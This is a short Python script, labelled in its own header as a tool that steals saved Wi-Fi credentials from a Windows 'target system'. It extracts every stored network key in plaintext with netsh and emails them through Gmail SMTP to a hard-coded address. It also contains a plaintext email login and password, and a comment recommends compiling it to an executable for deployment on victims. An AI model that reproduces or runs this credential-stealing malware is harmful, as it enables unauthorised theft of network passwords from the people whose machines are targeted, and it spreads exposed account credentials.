#!/usr/bin/python

# SIMPLE SCRIPT WHICH STEALS SAVED Wi-Fi CREDENTIALS
# FROM A WINDOWS TARGET SYSTEM
# AND MAILS ALL THE DETAILS BACK TO A SPECIFIED EMAIL ADDRESS 
# FROM A SPECIFIED EMAIL ADDRESS
# 
# NOTE:- EMAIL CREDENTIALS ARE STORED IN THE SCRIPT ITSELF
# SO IT IS BETTER TO DEPLOY THE COMPILED EXECUTABLE FILE
# ON THE TARGET INSTEAD OF THE RAW SCRIPT

import subprocess as sp
import smtplib, re

# command to retrieve a list of all available wireless netowrks
cmd = "netsh wlan show profile"
# store the output of the above command in the networks variable
networks = sp.check_output(cmd, shell=True)
# need to extract only the network names from the formatted output, using regex for that
net_List = re.findall('(?:Profile\s*:\s)(.*)' , networks)

final_output = ""

for network in net_List:
#	pass_cmd = "netsh wlan show profile " + network + " key=clear | findstr \"Key Content\""
	pass_cmd = "netsh wlan show profile " + network + " key=clear"
	net_result = sp.check_output(pass_cmd, shell=True)
#	final_output += net_result.split(": ")[-1]
	final_output += net_result


print(final_output)

	
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()

from_addr = "ricky.001.darkforce@gmail.com"
to_addr = "raktim.saha.006@gmail.com"
Pass = "RaktimSaha1"

server.login(from_addr, Pass)
server.sendmail(from_addr, to_addr, final_output)
server.quit()

